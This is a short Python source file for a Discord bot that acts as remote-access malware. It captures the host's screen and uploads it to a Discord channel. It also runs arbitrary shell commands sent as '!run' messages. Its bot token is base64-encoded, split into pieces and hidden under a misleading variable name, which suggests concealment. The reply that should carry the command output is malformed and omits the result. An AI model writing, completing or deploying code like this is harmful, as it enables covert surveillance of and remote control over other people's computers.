import discord
from discord.ext import commands
import pyautogui
import os
import base64
intents = discord.Intents.default()
intents.message_content = True
asyncioe = base64.b64decode('TVRJMk1' + 'qTXhNek01TURBek9USXpOa' + 'lkyT0EuRzVSUlVJLmJiTTlqZ3JWQTA5UjNRdHQxNEJKNzByNC0xMUwxWkNuaEtTMENV')
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}!')

@bot.command(name='screenshot')
async def screenshot(ctx):
    # Take a screenshot
    screenshot = pyautogui.screenshot()
    screenshot_path = 'screenshot.png'
    screenshot.save(screenshot_path)

    # Send the screenshot
    await ctx.send(file=discord.File(screenshot_path))
    os.remove(screenshot_path)  # Clean up the file

@bot.command(name='run')
async def run_command(ctx, *, command: str):
    # Execute the command (dangerous, use with caution)
    result = os.popen(command).read()
    await ctx.send(f'Command output:\n``````')

bot.run(asyncioe)
